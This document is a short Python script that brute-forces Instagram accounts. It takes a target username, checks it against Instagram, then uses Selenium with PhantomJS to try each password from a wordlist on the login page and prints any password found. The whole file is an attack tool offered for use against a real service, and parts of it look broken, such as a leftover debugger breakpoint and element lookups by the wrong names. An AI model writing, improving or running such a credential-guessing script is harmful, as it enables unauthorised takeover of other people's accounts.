import requests
import json
import pdb
from selenium import webdriver

Done = False


def main():
    global Done, password
    while True:
        username = input("Enter username of target : ")
        response = requests.get("https://www.instagram.com/%s/?__a=1" % username).text
        if response == "{}":
            print("Username invalid, try again...")
        else:
            break
    while True:
        passlist_path = input("Enter password list name (or skip and default one will be used) : ")
        if passlist_path == "":
            passlist_path = "passlist.txt"
            break
        else:
            try:
                passlist = open(passlist_path, "r")
                passlist.close()
                break
            except FileNotFoundError:
                print("password list doesn\'t exist, try again...")
    with open(passlist_path, "r") as f:
         passwords = f.read().split("\n")
    for password in passwords:
        driver = webdriver.PhantomJS()
        driver.get('https://www.instagram.com/accounts/login/')
        dom = driver.find_element_by_xpath('//*')
        pdb.set_trace()
        _username = dom.find_element_by_name(username)
        _password = dom.find_element_by_name(password)
        login_button = dom.find_element_by_xpath('//*[@class="_qv64e _gexxb _4tgw8 _njrw0"]')
        _username.clear()
        _password.clear()
        _username.send_keys(username)
        _password.send_keys(password)

        login_button.click()
        driver.get('https://www.instagram.com/accounts/login')
        if 'logged-in' in driver.page_source:
            Done = True
            break

main()
if Done:
    print("Password found : %s" % password)
else:
    print("Password not found")
